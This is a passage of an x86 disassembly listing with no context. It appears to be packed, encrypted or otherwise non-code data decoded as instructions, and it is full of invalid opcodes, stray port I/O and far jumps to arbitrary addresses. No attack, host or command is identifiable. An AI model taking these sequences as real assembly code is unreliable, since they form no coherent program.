  404b45:	fdiv   DWORD PTR [ebp+edx*1-0x17]
  404b49:	xchg   edx,eax
  404b4a:	dec    eax
  404b4b:	xchg   DWORD PTR [edi+ebx*8-0x69],ebx
  404b4f:	xchg   ebx,eax
  404b50:	repnz stos DWORD PTR es:[edi],eax
  404b52:	inc    eax
  404b53:	mov    ds:0x1d8ab2ed,eax
  404b58:	mov    al,0xe7
  404b5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404b5b:	pop    edi
  404b5c:	cdq    
  404b5d:	jmp    0x404b17
  404b5f:	pop    es
  404b60:	jne    0x404b29
  404b62:	sbb    DWORD PTR [ecx+0x39],ebp
  404b65:	inc    ebp
  404b66:	add    DWORD PTR [ebx-0x55],0x10
  404b6a:	inc    ecx
  404b6b:	and    al,0x98
  404b6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b6e:	test   DWORD PTR [edi+0x43],ebx
  404b71:	adc    BYTE PTR [ecx+0x1b0d5524],bl
  404b77:	xor    BYTE PTR [ebx+ecx*8],0xb2
  404b7b:	pop    eax
  404b7c:	cmp    DWORD PTR [ecx],ebx
  404b7e:	dec    ecx
  404b7f:	mov    ds:0x99402204,eax
  404b84:	fstp   DWORD PTR [edi]
  404b86:	push   ebx
  404b87:	add    al,0x40
  404b89:	xchg   ecx,eax
  404b8a:	ror    dl,cl
  404b8c:	arpl   WORD PTR [edx],cx
  404b8e:	and    BYTE PTR [eax-0x1f31d444],cl
  404b94:	pop    ebp
  404b95:	add    al,0x29
  404b97:	cmp    BYTE PTR [ecx-0x34f99885],dl
  404b9d:	not    BYTE PTR [eax]
  404b9f:	ja     0x404be7
  404ba1:	loopne 0x404bdc
  404ba3:	int    0xe3
  404ba5:	push   edx
  404ba6:	fdivr  DWORD PTR [edi]
  404ba8:	rcr    BYTE PTR [edx],0xb
  404bab:	(bad)  
  404bac:	jns    0x404b81
  404bae:	mov    ecx,0xaf9b3ca4
  404bb3:	inc    ecx
  404bb4:	pushf  
  404bb5:	push   ecx
  404bb6:	adc    eax,0xebdec8d6
  404bbb:	outs   dx,DWORD PTR ds:[esi]
  404bbc:	push   cs
  404bbd:	xlat   BYTE PTR ds:[ebx]
  404bbe:	inc    ebx
  404bbf:	mov    ds:0x842c1b97,al
  404bc4:	das    
  404bc5:	add    BYTE PTR [eax-0x21d8afa5],0x4e
  404bcc:	push   esi
  404bcd:	aad    0x23
  404bcf:	or     al,0xf0
  404bd1:	lahf   
  404bd2:	ja     0x404ba6
  404bd4:	mov    dh,0xcc
  404bd6:	inc    eax
  404bd7:	ret    0x5b94
  404bda:	je     0x404b7f
  404bdc:	xchg   esi,eax
  404bdd:	pop    ecx
  404bde:	pop    ss
  404bdf:	fnstsw WORD PTR [edi-0x80]
  404be2:	fnstenv [ebp-0x3199120b]
  404be8:	dec    ebp
  404be9:	pop    eax
  404bea:	(bad)  
  404beb:	daa    
  404bec:	scas   al,BYTE PTR es:[edi]
  404bed:	loopne 0x404c57
  404bef:	imul   ch
  404bf1:	lods   al,BYTE PTR ds:[esi]
  404bf2:	mov    bh,0x9a
  404bf4:	adc    BYTE PTR [edx],0x5
  404bf7:	jmp    0xecda2a81
  404bfc:	popa   
  404bfd:	sub    al,0x8
  404bff:	das    
  404c00:	mov    cl,0x91
  404c02:	icebp  
  404c03:	repnz idiv BYTE PTR [ecx+0x5]
  404c07:	or     eax,0xed3b7ba8
  404c0c:	add    BYTE PTR [ecx+0x5f],dh
  404c0f:	sbb    dh,al
  404c11:	mov    esp,0x9709aae9
  404c16:	ror    DWORD PTR [ecx-0x753f7cff],1
  404c1c:	idiv   BYTE PTR [ecx-0x601f8e]
  404c22:	js     0x404c74
  404c24:	push   0xc1c5e006
  404c29:	jmp    0xdb1f:0x25900042
  404c30:	inc    ecx
  404c31:	ret    
  404c32:	imul   edi,DWORD PTR [ecx+edx*2+0x57],0x45a2dad8
  404c3a:	test   eax,0x1447a94a
  404c3f:	add    DWORD PTR [edx+edx*8],0xf205edfe
  404c46:	inc    ebx
  404c47:	inc    ecx
  404c48:	stc    
  404c49:	sub    al,0xd6
  404c4b:	scas   al,BYTE PTR es:[edi]
  404c4c:	inc    ecx
  404c4d:	outs   dx,DWORD PTR ds:[esi]
  404c4e:	enter  0xd67b,0xe
  404c52:	and    eax,0x839a95f3
  404c57:	lock popf 
  404c59:	cmp    DWORD PTR [eax-0x68],edi
  404c5c:	ror    BYTE PTR [eax+0x5b0cec40],1
  404c62:	sbb    ch,dl
  404c64:	icebp  
  404c65:	call   0x1463:0xf052caa5
  404c6c:	fst    DWORD PTR [eax]
  404c6e:	ficomp DWORD PTR [eax+0x24]
  404c71:	pusha  
  404c72:	call   0x9e3c:0xe303f096
  404c79:	mov    cl,0xa9
  404c7b:	cmc    
  404c7c:	pop    ecx
  404c7d:	adc    ch,BYTE PTR [edi]
  404c7f:	mov    ch,0x69
  404c81:	jno    0x404c7d
  404c83:	sbb    dl,dh
  404c85:	mov    cl,0xa6
  404c87:	jno    0x404ca8
  404c89:	mov    WORD PTR [eax-0x11dd99cf],?
  404c8f:	sti    
  404c90:	js     0x404cf2
  404c92:	mov    ch,0xe8
  404c94:	xchg   esp,eax
  404c95:	adc    al,0xe2
  404c97:	mov    esi,0x602298f8
  404c9c:	iret   
  404c9d:	inc    edx
  404c9e:	call   ecx
  404ca0:	mov    ds:0xe904f2f,eax
  404ca5:	adc    DWORD PTR [ebx-0xd],esp
  404ca8:	jo     0x404d14
  404caa:	ret    
  404cab:	jle    0x404c96
  404cad:	shr    BYTE PTR [ebx],0xd4
  404cb0:	cmp    eax,0x12194ed0
  404cb5:	test   eax,0xc2d84b65
  404cba:	mov    esi,0xb3aa382e
  404cbf:	ins    DWORD PTR es:[edi],dx
  404cc0:	out    dx,al
  404cc1:	fidivr WORD PTR [edi+0x5217105b]
  404cc7:	in     al,dx
  404cc8:	pop    esp
  404cc9:	sar    BYTE PTR [ecx+0x63031fb],0x92
  404cd0:	call   ecx
  404cd2:	xchg   ebp,eax
  404cd3:	cmp    BYTE PTR [edx+0xf],al
  404cd6:	call   0x53a6:0xa6c77230
  404cdd:	add    BYTE PTR [esi],al
  404cdf:	add    eax,0x1d60528f
  404ce4:	mov    cl,0xf4
  404ce6:	xor    dh,0x62
  404ce9:	fsub   DWORD PTR [edi+0x30ce2f1]
  404cef:	scas   eax,DWORD PTR es:[edi]
  404cf0:	push   0xa9ad5526
  404cf5:	out    dx,eax
  404cf6:	retf   
  404cf7:	rcl    BYTE PTR [ebx],cl
  404cf9:	sub    esp,DWORD PTR [eax-0x16d6fd7d]
  404cff:	popa   
  404d00:	das    
  404d01:	sbb    al,0x10
  404d03:	rol    esi,0xca
  404d06:	or     al,0xa4
  404d08:	mov    dh,0xa5
  404d0a:	std    
  404d0b:	xor    ecx,DWORD PTR [eax+0x57]
  404d0e:	mov    ch,BYTE PTR [edx-0x18]
  404d11:	dec    ecx
  404d12:	jae    0x404d52
  404d14:	push   0x56
  404d16:	scas   eax,DWORD PTR es:[edi]
  404d17:	fistp  WORD PTR [eax-0x3735e503]
  404d1d:	cdq    
  404d1e:	les    eax,FWORD PTR [edi+0x26]
  404d21:	mov    DWORD PTR [eax+eax*4-0x688e8fd3],edx
  404d28:	pop    esi
  404d29:	or     al,0xc5
  404d2b:	leave  
  404d2c:	jl     0x404d92
  404d2e:	pop    ebx
  404d2f:	add    bl,al
  404d31:	inc    esi
  404d32:	mov    edx,?
  404d34:	mov    ah,BYTE PTR [ebx]
  404d36:	pop    eax
  404d37:	leave  
  404d38:	jmp    0x5a6eb64d
  404d3d:	das    
  404d3e:	push   ss
  404d3f:	test   BYTE PTR [esi*4-0x7419293c],0xf0
  404d47:	pop    DWORD PTR [ebp+0x9]
  404d4a:	dec    ebx
  404d4b:	outs   dx,BYTE PTR ds:[esi]
  404d4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d4d:	or     BYTE PTR [edi-0x4a],al
  404d50:	in     eax,dx
  404d51:	mov    dh,0x8d
  404d53:	pop    esi
  404d54:	in     eax,dx
  404d55:	push   esi
  404d56:	in     al,dx
  404d57:	push   es
  404d58:	(bad)  
  404d59:	mov    ?,WORD PTR [ecx+0x2]
  404d5c:	(bad)  
  404d5d:	stc    
  404d5e:	(bad)  
  404d5f:	xlat   BYTE PTR ds:[ebx]
  404d60:	int    0x29
  404d62:	jns    0x404d86
  404d64:	xchg   ebx,eax
  404d65:	xor    bh,cl
  404d67:	stc    
  404d68:	test   BYTE PTR [eax-0x17],dl
  404d6b:	push   edx
  404d6c:	gs pop ds
  404d6e:	in     al,dx
  404d6f:	fimul  DWORD PTR [ebp+0x60e1cb26]
  404d75:	mov    ch,0xcc
  404d77:	outs   dx,DWORD PTR ds:[esi]
  404d78:	pop    eax
  404d79:	jmp    0x7f13e84e
  404d7e:	stos   BYTE PTR es:[edi],al
  404d7f:	pop    ebx
  404d80:	pop    ebp
  404d81:	test   BYTE PTR [esi+eax*2-0x4d],0x50
  404d86:	les    ebp,FWORD PTR [ecx-0x5b4d9766]
  404d8c:	iret   
  404d8d:	nop
  404d8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404d8f:	(bad)  
  404d90:	in     eax,dx
  404d91:	push   ds
  404d92:	adc    DWORD PTR [edi+0x7],eax
  404d95:	mov    ah,0xce
  404d97:	dec    ecx
  404d98:	sbb    BYTE PTR [edi],al
  404d9a:	sbb    DWORD PTR [ebx],edx
  404d9c:	lds    edi,FWORD PTR [ebp-0x64]
  404d9f:	icebp  
  404da0:	aas    
  404da1:	jbe    0x404e0a
  404da3:	add    DWORD PTR [ebx+0x4fa5294b],ebx
  404da9:	sbb    ebx,DWORD PTR [esi+0x46a0f54b]
  404daf:	push   edx
  404db0:	dec    ecx
  404db1:	icebp  
  404db2:	jmp    0x4a424a15
  404db7:	scas   al,BYTE PTR es:[edi]
  404db8:	or     DWORD PTR [ecx],ebp
  404dba:	retf   0x9a35
  404dbd:	imul   ebx,DWORD PTR [esi+0x0],0xe8924872
  404dc4:	test   esi,ebp
  404dc6:	std    
  404dc7:	daa    
  404dc8:	loop   0x404dd8
  404dca:	sbb    cl,BYTE PTR [edx-0x3e]
  404dcd:	test   DWORD PTR [eax],0x3368f918
  404dd3:	cdq    
  404dd4:	mov    ds:0xf6239c0c,eax
  404dd9:	into   
  404dda:	xchg   ebp,eax
  404ddb:	out    dx,eax
  404ddc:	loop   0x404e17
  404dde:	bound  ecx,QWORD PTR [edx+edx*1-0x271d3ed]
  404de5:	in     eax,0x1e
  404de7:	aaa    
  404de8:	dec    eax
  404de9:	inc    esi
  404dea:	(bad)  
  404deb:	fsubr  DWORD PTR [edi-0x1aac023c]
  404df1:	lods   eax,DWORD PTR ds:[esi]
  404df2:	add    BYTE PTR [ecx-0x35],bh
  404df5:	inc    esp
  404df6:	sub    eax,0x80483731
  404dfb:	inc    edi
  404dfc:	mov    dh,BYTE PTR [esi]
  404dfe:	jmp    0x404dc3
  404e00:	or     ecx,DWORD PTR [esi+0x13d93a4]
  404e06:	jmp    0x4e741f59
  404e0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404e0c:	sbb    DWORD PTR [ebx+0x6b],esp
  404e0f:	es scas eax,DWORD PTR es:[edi]
  404e11:	inc    eax
  404e12:	jge    0x404e57
  404e14:	in     eax,dx
  404e15:	jmp    0x584d3c59
  404e1a:	sub    edx,ebx
  404e1c:	jmp    0x404e9d
  404e1e:	test   BYTE PTR [eax],cl
  404e20:	inc    ebp
  404e21:	adc    dl,BYTE PTR [eax-0x50]
  404e24:	jbe    0x404ea1
  404e26:	arpl   bp,cx
  404e28:	inc    ebx
  404e29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e2a:	aam    0x83
  404e2c:	scas   al,BYTE PTR es:[edi]
  404e2d:	ret    
  404e2e:	pop    ds
  404e2f:	out    dx,al
  404e30:	and    dh,dh
  404e32:	jns    0x404e67
  404e34:	push   0x17bb5fa1
  404e39:	xor    eax,0xdb1c5a0
  404e3e:	gs loope 0x404e3d
  404e41:	das    
  404e42:	sub    al,0x41
  404e44:	sub    ah,BYTE PTR [eax-0x1e]
  404e47:	mov    al,BYTE PTR [ecx+edx*8]
  404e4a:	(bad)  
  404e4b:	retf   0x6b5
  404e4e:	mov    cl,0x58
  404e50:	mov    esi,cs
  404e52:	ins    DWORD PTR es:[edi],dx
  404e53:	cmp    al,BYTE PTR [edx]
  404e55:	outs   dx,DWORD PTR ds:[esi]
  404e56:	and    esi,edi
  404e58:	xlat   BYTE PTR ds:[ebx]
  404e59:	jns    0x404e52
  404e5b:	pop    eax
  404e5c:	xchg   ecx,eax
  404e5d:	fwait
  404e5e:	mov    cl,BYTE PTR [edx+eax*2+0x30f3ce22]
  404e65:	loope  0x404dea
  404e67:	mov    ecx,0x158dcb1
  404e6c:	mov    edi,0xd15b27c7
  404e71:	retf   0x31c0
  404e74:	fisttp WORD PTR [eax+0x3e9fe588]
  404e7a:	in     eax,dx
  404e7b:	sahf   
  404e7c:	mov    ecx,fs
  404e7e:	mov    bl,0x29
  404e80:	fcomp  st(6)
  404e82:	in     al,dx
  404e83:	or     DWORD PTR [eax+0x52211d73],0xa692c54b
  404e8d:	mov    esp,0x8c2763fa
  404e92:	idiv   DWORD PTR [eax+0x4626936f]
  404e98:	xchg   ecx,eax
  404e99:	sbb    al,0x6e
  404e9b:	call   FWORD PTR ss:[edi-0x3e521f56]
  404ea2:	in     eax,0x5f
  404ea4:	adc    edi,DWORD PTR [ebx+0x4e660a4a]
  404eaa:	dec    ecx
  404eab:	push   0x48e1353
  404eb0:	lods   al,BYTE PTR ds:[esi]
  404eb1:	dec    esp
  404eb2:	js     0x404ec1
  404eb4:	sbb    eax,0xa9d88001
  404eb9:	inc    esi
  404eba:	hlt    
  404ebb:	mov    edi,0x881a355b
  404ec0:	aas    
  404ec1:	nop
  404ec2:	mov    cl,0x1
  404ec4:	in     eax,0x6
  404ec6:	push   eax
  404ec7:	shl    BYTE PTR [edx-0x3b],1
  404eca:	jno    0x404f4b
  404ecc:	xor    DWORD PTR [ebx],esi
  404ece:	cmp    al,0xef
  404ed0:	scas   eax,DWORD PTR es:[edi]
  404ed1:	adc    eax,0x88a0c4eb
  404ed6:	mov    bh,0x7c
  404ed8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404ed9:	inc    ecx
  404eda:	mov    ecx,0xabbbbaa4
  404edf:	stos   BYTE PTR es:[edi],al
  404ee0:	jno    0x404f2d
  404ee2:	pop    esp
  404ee3:	jne    0x404f57
  404ee5:	sbb    BYTE PTR [edi-0x5870d51b],ch
  404eeb:	ins    BYTE PTR es:[edi],dx
  404eec:	pop    esi
  404eed:	and    al,0xc
  404eef:	test   BYTE PTR [ebx+0x6b],al
  404ef2:	jp     0x404f21
  404ef4:	xor    ch,BYTE PTR [edx+edx*2-0x639c46f7]
  404efb:	mov    DWORD PTR [ebx],esi
  404efd:	mov    bh,0x3b
  404eff:	test   al,0xd3
  404f01:	inc    edi
  404f02:	dec    eax
  404f03:	shl    bl,1
  404f05:	lea    esi,[ebp+0x561797fd]
  404f0b:	ror    DWORD PTR [edi],0xc1
  404f0e:	(bad)  
  404f0f:	int    0x62
  404f11:	lahf   
  404f12:	and    ebx,DWORD PTR [edx]
  404f14:	inc    ebx
  404f15:	pushf  
  404f16:	mov    ebp,0x6cc6fa07
  404f1b:	sahf   
  404f1c:	retf   
  404f1d:	shr    edi,1
  404f1f:	inc    edx
  404f20:	cmp    DWORD PTR [edx+edi*8-0x3b],0x928449c
  404f28:	daa    
  404f29:	or     DWORD PTR [ebp-0x2c76141e],edi
  404f2f:	pop    ebx
  404f30:	jmp    0x62507da5
  404f35:	retf   0x70ab
  404f38:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  404f3a:	das    
  404f3b:	fwait
  404f3c:	and    ah,BYTE PTR ds:0x3a7b715a
  404f42:	mov    ebx,0xd7626998
  404f47:	jne    0x404f34
  404f49:	rcr    DWORD PTR [ecx],0xa5
  404f4c:	mov    ss,ecx
  404f4e:	mov    esp,0xd0d9ec32
  404f53:	lds    esi,FWORD PTR gs:[eax+0x39e16576]
  404f5a:	loop   0x404f5a
  404f5c:	inc    edx
  404f5d:	(bad)  
  404f5e:	mov    dh,0x37
  404f60:	dec    ebx
  404f61:	cld    
  404f62:	push   0x20a68c5b
  404f67:	ficom  WORD PTR [ebp-0x30461e6c]
  404f6d:	mov    ah,0x26
  404f6f:	clc    
  404f70:	dec    esi
  404f71:	adc    ecx,DWORD PTR [esi-0x50]
  404f74:	gs dec edi
  404f76:	xor    ah,BYTE PTR [ebp-0x22af4fa6]
  404f7c:	fmul   st,st(7)
  404f7e:	cmc    
  404f7f:	add    esp,DWORD PTR [ebp+0x79956034]
  404f85:	pop    edx
  404f86:	dec    esp
  404f87:	inc    edi
  404f88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404f89:	loope  0x404f1d
  404f8b:	pop    ebx
  404f8c:	(bad)
  404f8f:	mov    ecx,0xc79d66c5
  404f94:	inc    esi
  404f95:	cmp    esi,DWORD PTR [eax+0x7fb668a7]
  404f9b:	ds inc esi
  404f9d:	out    dx,al
  404f9e:	ret    0x5480
  404fa1:	sbb    eax,0x2154180b
  404fa6:	fstp   TBYTE PTR [eax+ebx*1-0x6478cc6d]
  404fad:	pop    ss
  404fae:	leave  
  404faf:	cmp    DWORD PTR [edi-0x6b60db98],ecx
  404fb5:	pushf  
  404fb6:	in     eax,0x44
  404fb8:	push   cs
  404fb9:	or     DWORD PTR [edx-0x1a],ecx
  404fbc:	lds    ecx,FWORD PTR [edx]
  404fbe:	cmp    eax,0x53221fe5
  404fc3:	pop    es
  404fc4:	retf   0x41f8
  404fc7:	cmp    ecx,DWORD PTR [ebx-0x19]
  404fca:	cmp    al,0x78
  404fcc:	out    0x82,eax
  404fce:	push   esp
  404fcf:	or     BYTE PTR [ebx-0x775253ca],bl
  404fd5:	dec    esp
  404fd6:	dec    edi
  404fd7:	pop    ds
  404fd8:	push   esi
  404fd9:	dec    di
  404fdb:	es xchg ecx,eax
  404fdd:	xor    eax,0xdcb0e5f9
  404fe2:	sub    esi,0x19eeb44c
  404fe8:	jnp    0x405059
  404fea:	and    DWORD PTR [edx+0xa6f2ccd],esi
  404ff0:	push   esp
  404ff1:	sub    ebp,edi
  404ff3:	lahf   
  404ff4:	or     al,0x2f
  404ff6:	mov    WORD PTR [edi],gs
  404ff8:	(bad)  
  404ffa:	xchg   ebx,eax
  404ffb:	sbb    edi,DWORD PTR [edx+0x3c]
  404ffe:	mov    eax,ds:0xbf701627
  405003:	mov    ds:0xfc0530b8,eax
  405008:	out    0x9c,al
  40500a:	xchg   ebx,eax
  40500b:	fbstp  TBYTE PTR [edx-0x34]
  40500e:	test   DWORD PTR [ecx+eiz*4+0x3bdfa583],eax
  405015:	out    dx,eax
  405016:	clc    
  405017:	jge    0x404ff6
  405019:	inc    ebx
  40501a:	arpl   WORD PTR [esi+edi*8+0x6cf5e1b5],si
  405021:	sub    ecx,edx
  405023:	rcr    ebx,cl
  405025:	cmp    eax,0x1b1d7600
  40502a:	mov    WORD PTR [edx-0x43],fs
  40502d:	cli    
  40502e:	and    esp,DWORD PTR [esi-0x42]
  405031:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405032:	sbb    dh,BYTE PTR [edi+esi*2+0x69fe1058]
  405039:	pusha  
  40503a:	inc    ecx
  40503b:	dec    edx
  40503c:	xor    al,0xae
  40503e:	js     0x405054
  405040:	fdiv   st(6),st
  405042:	enter  0x2009,0x2c
  405046:	mov    eax,ds:0xa8061aab
  40504b:	inc    ebp
  40504c:	sub    bl,0xd
  40504f:	les    esi,FWORD PTR [esi+0x71]
  405052:	and    BYTE PTR [eax-0x78],ch
  405055:	mov    cl,bh
  405057:	sub    edx,ecx
  405059:	pop    esi
  40505a:	aaa    
  40505b:	bound  edx,QWORD PTR [esi]
  40505d:	mov    edi,0x617e4785
  405062:	cli    
  405063:	sub    ebx,eax
  405065:	clc    
  405066:	mov    esi,0xba5cbef5
  40506b:	ja     0x40509c
  40506d:	xor    al,0x84
  40506f:	leave  
  405070:	test   eax,0xcada4c03
  405075:	call   0x89a59c7f
  40507a:	sub    cl,BYTE PTR [eax-0x4d]
  40507d:	sbb    BYTE PTR [eax-0x6a1b5044],dl
  405083:	sub    ebp,edx
  405085:	xchg   esi,eax
  405086:	or     eax,0x4ad99c91
  40508b:	imul   ebp,ebp,0xe1be6648
  405091:	mov    eax,0x7d618f8e
  405096:	mov    ebx,0x5ad05497
  40509b:	mov    gs:0x35e72136,al
  4050a1:	popa   
  4050a2:	mov    cl,0xb9
  4050a4:	mov    ecx,DWORD PTR [edi]
  4050a6:	bound  ebp,QWORD PTR [ecx]
  4050a8:	cwde   
  4050a9:	xor    DWORD PTR [eax+0x4a4f1613],0xffffffe9
  4050b0:	and    al,0x2e
  4050b2:	shl    BYTE PTR [esi-0x69],1
  4050b5:	ins    DWORD PTR es:[edi],dx
  4050b6:	inc    ecx
  4050b7:	ja     0x405083
  4050b9:	loop   0x405102
  4050bb:	loop   0x40509e
  4050bd:	hlt    
  4050be:	retf   
  4050bf:	add    edx,edx
  4050c1:	or     DWORD PTR [esi+0x1e],0xffffffcf
  4050c5:	xchg   ebp,eax
  4050c6:	imul   edi,DWORD PTR [ecx],0xffffffa0
  4050c9:	adc    esi,ecx
  4050cb:	fwait
  4050cc:	jnp    0x405112
  4050ce:	fimul  DWORD PTR [ebp+eax*4+0x73]
  4050d2:	sub    BYTE PTR [esi+0x4accbae1],cl
  4050d8:	cmc    
  4050d9:	push   esp
  4050da:	jp     0x405106
  4050dc:	jmp    0x2dbfb76a
  4050e1:	out    0x65,eax
  4050e3:	pop    ebx
  4050e4:	(bad)  
  4050e5:	push   0x73
  4050e7:	das    
  4050e8:	stos   BYTE PTR es:[edi],al
  4050e9:	fild   WORD PTR [esi+0x46f3f818]
  4050ef:	data16 (bad) 
  4050f1:	cld    
  4050f2:	push   ecx
  4050f3:	jb     0x405171
  4050f5:	or     BYTE PTR [ebx],ah
  4050f7:	jns    0x40514c
  4050f9:	jnp    0x405167
  4050fb:	jl     0x405083
  4050fd:	jb     0x405144
  4050ff:	sub    eax,ebx
  405101:	sub    eax,0x8ec25447
  405106:	icebp  
  405107:	(bad)  
  405108:	sahf   
  405109:	push   eax
  40510a:	jns    0x4050f0
  40510c:	pusha  
  40510d:	jno    0x405093
  40510f:	dec    esi
  405110:	and    BYTE PTR [edi-0x7c],bl
  405113:	fwait
  405114:	push   es
  405115:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405116:	pop    edi
  405117:	mov    cl,0x34
  405119:	push   edx
  40511a:	mov    cl,0x37
  40511c:	loopne 0x40514b
  40511e:	jecxz  0x4050b9
  405120:	ss out 0x34,eax
  405123:	xor    eax,0x3a052f7e
  405128:	sub    eax,0x97e4a954
  40512d:	nop
  40512e:	shr    DWORD PTR [eax],1
  405130:	loop   0x405183
  405132:	cli    
  405133:	inc    esi
  405134:	mov    ecx,ebp
  405136:	mov    bl,0xb6
  405138:	mov    al,ds:0xfdb287c6
  40513d:	inc    ecx
  40513e:	imul   ecx,eax,0xf8dddddb
  405144:	sbb    esi,DWORD PTR [edi-0x31]
  405147:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405148:	jne    0x40510c
  40514a:	test   al,0x88
  40514c:	(bad)
  405151:	sti    
  405152:	retf   
  405153:	push   eax
  405154:	push   0xc05c288c
  405159:	dec    eax
  40515a:	test   al,0x7d
  40515c:	or     BYTE PTR [eax+0x1b09d156],ah
  405162:	mov    ah,0x89
  405164:	test   eax,0xec4db5fe
  405169:	cmp    edx,DWORD PTR [ebx]
  40516b:	jne    0x40516c
  40516d:	sub    BYTE PTR [ebp+ecx*2+0x7],bl
  405171:	mov    esi,0xb11d8515
  405176:	fdivr  DWORD PTR [esi]
  405179:	ins    BYTE PTR es:[edi],dx
  40517a:	mov    ebp,0x360cffa7
  40517f:	addr16 inc edi
  405181:	lock shl BYTE PTR cs:[eax],cl
  405185:	jmp    FWORD PTR [ebx-0x713aa7dd]
  40518b:	sbb    al,0x29
  40518d:	dec    eax
  40518e:	jge    0x40518f
  405190:	sub    eax,0xb993f7e9
  405195:	mov    esi,0x141f8210
  40519a:	and    al,0xa1
  40519c:	repz xchg ecx,eax
  40519e:	rol    DWORD PTR ds:0xf5ee655d,0x1b
  4051a5:	and    DWORD PTR gs:[ebp+0x536ae3a1],edi
  4051ac:	jl     0x4051db
  4051ae:	lods   al,BYTE PTR ds:[esi]
  4051af:	popf   
  4051b0:	in     al,dx
  4051b1:	mov    ebx,0xc6fdd79e
  4051b6:	pop    ecx
  4051b7:	cli    
  4051b8:	enter  0xdbaa,0x84
  4051bc:	xchg   BYTE PTR [esi],bh
  4051be:	aaa    
  4051bf:	and    eax,0x1d5d579b
  4051c4:	xor    edx,DWORD PTR [edx-0x77]
  4051c7:	dec    ecx
  4051c8:	call   0xc835:0xdd0cd308
  4051cf:	int    0xa2
  4051d1:	mov    cl,0x62
  4051d3:	jecxz  0x405166
  4051d5:	mov    ch,0x7a
  4051d7:	shr    BYTE PTR [ecx-0x32052b8f],cl
  4051dd:	retf   
  4051de:	call   0x815186d0
  4051e3:	pop    ecx
  4051e4:	adc    DWORD PTR ds:0xd7d4cda2,0x9ea17abd
  4051ee:	imul   esp,DWORD PTR [ecx],0x2c540ed5
  4051f4:	in     eax,0x2e
  4051f6:	jno    0x405262
  4051f8:	and    eax,0xa1edae35
  4051fd:	cmp    edi,esp
  4051ff:	xchg   esp,eax
  405200:	jmp    0x95252ef9
  405205:	pop    esi
  405206:	ins    BYTE PTR es:[edi],dx
  405207:	or     BYTE PTR [edi+esi*2+0x78],bl
  40520b:	sub    DWORD PTR [esi],edx
  40520d:	pusha  
  40520e:	clc    
  40520f:	push   ebp
  405210:	hlt    
  405211:	outs   dx,DWORD PTR ds:[esi]
  405212:	jp     0x405226
  405214:	fcom   DWORD PTR [esi]
  405216:	enter  0x1dd4,0x31
  40521a:	dec    ebx
  40521b:	mov    WORD PTR [esi+edx*8+0x3c],es
  40521f:	fld    TBYTE PTR [eax-0x42]
  405222:	rcl    DWORD PTR [ebx-0xe],0x59
  405226:	imul   edi,DWORD PTR [edx-0x2e],0x4f
  40522a:	iret   
  40522b:	push   esp
  40522c:	mov    edi,DWORD PTR [edi]
  40522e:	xlat   BYTE PTR ds:[ebx]
  40522f:	jecxz  0x4051fd
  405231:	mov    BYTE PTR [ecx],dh
  405233:	inc    edi
  405234:	cmp    eax,DWORD PTR [ebx*2-0x2b753e84]
  40523b:	and    eax,esi
  40523d:	shl    bh,1
  40523f:	inc    edx
  405240:	mov    ebx,0xa3bbad0f
  405245:	mov    ebp,esi
  405247:	popa   
  405248:	mov    esi,DWORD PTR ss:[edx+ebp*8-0x7fa9cf3]
  405250:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405251:	loop   0x405292
  405253:	dec    edi
  405254:	dec    ebx
  405255:	test   BYTE PTR [ecx+0x55],0x6e
  405259:	sbb    eax,0x2db65573
  40525e:	ds out 0xcc,al
  405261:	stc    
  405262:	add    ecx,DWORD PTR [edi+ebp*4-0x69]
  405266:	jno    0x4051e8
  405268:	inc    edx
  405269:	stos   DWORD PTR es:[edi],eax
  40526a:	mov    bl,0x30
  40526c:	mov    cl,0xe2
  40526e:	fs inc edi
  405270:	or     DWORD PTR [edx+0x1a],edi
  405273:	scas   eax,DWORD PTR es:[edi]
  405274:	imul   BYTE PTR [edx]
  405276:	jmp    0x8341:0x990f22a4
  40527d:	or     edi,edx
  40527f:	pop    edi
  405280:	jmp    FWORD PTR [ebp+edi*8+0x58c436ff]
  405287:	adc    al,0x66
  405289:	imul   esp,DWORD PTR [edx+0xcb728b2],0x38687efd
  405293:	fild   QWORD PTR [edx+ebx*4-0x5917ece0]
  40529a:	jns    0x405319
  40529c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40529d:	inc    edx
  40529e:	mov    bh,BYTE PTR [ecx+0x1c]
  4052a1:	cmp    eax,0x129513b9
  4052a6:	xchg   edi,eax
  4052a7:	ds dec esi
  4052a9:	pop    esi
  4052aa:	jmp    0xb6cb:0x4f697fd3
  4052b1:	mov    edi,DWORD PTR [esi+0x270f9b63]
  4052b7:	jmp    0xd6571f9d
  4052bc:	ins    DWORD PTR es:[edi],dx
  4052bd:	cmc    
  4052be:	sub    DWORD PTR [edx+0x76],ebx
  4052c1:	cmp    BYTE PTR [edx+0x5a],bl
  4052c4:	fist   DWORD PTR [edx-0x4d9f0a84]
  4052ca:	push   edx
  4052cb:	push   0x5b
  4052cd:	jmp    0x4052c1
  4052cf:	dec    ebp
  4052d0:	pop    es
  4052d1:	and    BYTE PTR [ebp+0x7f],0x79
  4052d5:	scas   al,BYTE PTR es:[edi]
  4052d6:	add    bl,dh
  4052d8:	or     eax,0xe8dee983
  4052dd:	ret    
  4052de:	pop    esi
  4052df:	and    al,0xb7
  4052e1:	inc    esp
  4052e2:	xlat   BYTE PTR ds:[ebx]
  4052e3:	adc    al,0xb3
  4052e5:	mov    dh,0xb5
  4052e7:	sbb    ah,BYTE PTR fs:[edx+0x3d]
  4052eb:	or     BYTE PTR [edx+0x394c6b9e],ah
  4052f1:	add    eax,0xae3548d5
  4052f6:	test   al,0x4e
  4052f8:	loope  0x405284
  4052fa:	idiv   BYTE PTR [ecx+0xd00b54d]
  405300:	mov    ds:0xf58daaaf,eax
  405305:	not    DWORD PTR [esi]
  405307:	rcr    DWORD PTR [edx],1
  405309:	add    eax,0x162686e3
